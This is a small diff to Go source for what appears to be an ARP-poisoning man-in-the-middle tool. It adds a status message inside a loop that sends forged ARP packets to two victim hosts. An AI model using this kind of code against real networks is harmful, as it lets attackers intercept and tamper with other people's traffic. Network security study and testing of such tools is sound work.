@@ -67,6 +67,7 @@ func ArpMitm(iface, victim1, victim2 string) {
 	intMac := utils.MacByInt(iface)
 	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2, intMac)
 
+	fmt.Println("[*] Poisoning targets...")
 	for i := 0; i < 100; i++ {
 		communication.Send(arpPacket1, iface)
 		time.Sleep(1 * time.Second)
